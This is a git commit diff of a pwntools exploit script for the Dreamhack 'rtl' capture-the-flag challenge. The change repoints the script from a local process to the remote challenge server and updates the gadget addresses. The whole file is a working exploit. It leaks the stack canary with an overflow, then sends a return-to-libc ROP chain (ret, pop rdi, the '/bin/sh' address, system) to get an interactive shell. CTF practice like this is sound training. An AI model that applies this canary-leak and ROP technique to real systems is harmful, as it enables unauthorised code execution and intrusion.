33df6e5ce8fc897efcd62699f8f824bd55d73306
KayTii <dkhoitran2106@gmail.com>
2025-03-27 17:28:41 +0700

    exp.py

--- Dreamhack/rtl/exp.py
+++ Dreamhack/rtl/exp.py
@@ -1,22 +1,24 @@
 from pwn import *
 
-p = process('./rtl')
+#p = process('./rtl')
+p = remote('host3.dreamhack.games', 9278)
 e = ELF('./rtl')
-gdb.attach(p, api=True)
+#gdb.attach(p, api=True)
 
-buf = b'a'*(0x40-0x8+1)
-p.sendafter(b"Buf: ", buf)
+buf = b'a'*(0x40 - 0x8 + 1)
+p.sendafter('Buf: ', buf)
 p.recvuntil(buf)
 canary = u64(b'\x00' + p.recvn(7))
 log.info('Canary ' + hex(canary))
-system = e.plt['system']
-binsh = 0x400874 #search /bin/sh
-rdi_ret = 0x0000000000400853 #ROPgadget --binary ./rtl | grep "pop rdi ; ret"
-ret = 0x0000000000400285 #ROPgadget --binary ./rtl | grep "ret"
 
-payload = b'a'*(0x40-0x8) + p64(canary) + b'a'*8
+binsh = 0x400874 #search /bin/sh
+pop_rdi = 0x0000000000400853 #ROPgadget --binary | grep "pop rdi ; ret"
+ret = 0x0000000000400596 #ROPgadget --binary | grep "ret"
+system = e.plt['system']
+
+payload = b'A'*(0x40-0x8) + p64(canary) + b'A'*0x8 
 payload += p64(ret) #prevent error cause by movaps
-payload += p64(rdi_ret) +p64(binsh) + p64(system) #system("/bin/sh")
+payload += p64(pop_rdi) + p64(binsh) + p64(system) #system(/bin/sh)
 p.sendafter(b'Buf: ', payload)
 
 p.interactive()
